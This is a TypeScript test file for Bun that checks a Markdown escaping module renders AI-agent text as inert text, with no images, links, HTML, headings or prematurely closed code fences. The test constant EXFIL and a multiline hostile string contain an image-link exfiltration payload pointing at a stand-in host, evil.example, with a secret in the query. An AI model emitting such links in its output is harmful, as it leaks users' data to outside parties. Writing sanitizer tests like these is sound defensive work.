import { expect, test } from "bun:test";
import { fence, plain, quote } from "./markdown.ts";

const EXFIL = "![x](https://evil.example/?d=secret) [ok](https://evil.example) <img src=x>";

test.each([
  ["plain", plain],
  ["quote", quote],
])("%s leaves no image, link or HTML in agent text", (_, render) => {
  const out = render(EXFIL);

  expect(out).not.toMatch(/(?<!\\)!(?<!\\)\[|(?<!\\)\]\(|(?<!\\)</);
});

test("plain keeps a title on one line, so it can't open a heading or a list", () => {
  expect(plain("Fix it\n# Approved\n- yes")).toBe("Fix it \\# Approved \\- yes");
});

test("a fence outlasts the backticks inside it, so the text can't close it early", () => {
  const out = fence("run ```\n![x](https://evil.example)\n````");

  expect(out.startsWith("`````text\n")).toBe(true);
  expect(out.endsWith("\n`````")).toBe(true);
});

test.each([
  ["plain", plain],
  ["quote", quote],
  ["fence", fence],
])("%s renders hostile multiline Markdown as text", (_, render) => {
  const text = `${EXFIL}\r# forged\r\n> quote\n~~~\n\u0060\u0060\u0060\u0060\n${EXFIL}\n[ref][1]\n[1]: https://evil.example`;
  const html = Bun.markdown.html(render(text));

  expect(html).not.toMatch(/<(?:img|a|h[1-6])\b/);
  expect(html).toContain("evil.example");
});

test("a large approval with many backtick runs still renders as one code block", async () => {
  const text = "`x ".repeat(200_000);
  const html = Bun.markdown.html(fence(text));

  expect(html.match(/<pre>/g)).toHaveLength(1);
  expect(html).toContain(text);

  // Raycast runs on Node: V8's call-argument limit is lower than Bun's.
  const child = Bun.spawn(
    [
      "node",
      "--experimental-strip-types",
      "--input-type=module",
      "-e",
      'const { fence } = await import(process.argv[1]); console.log(fence("`x ".repeat(200000)).length);',
      new URL("./markdown.ts", import.meta.url).href,
    ],
    { stdout: "pipe", stderr: "pipe" }
  );

  expect(await child.exited).toBe(0);
  expect((await new Response(child.stdout).text()).trim()).toBe(String(fence(text).length));
});
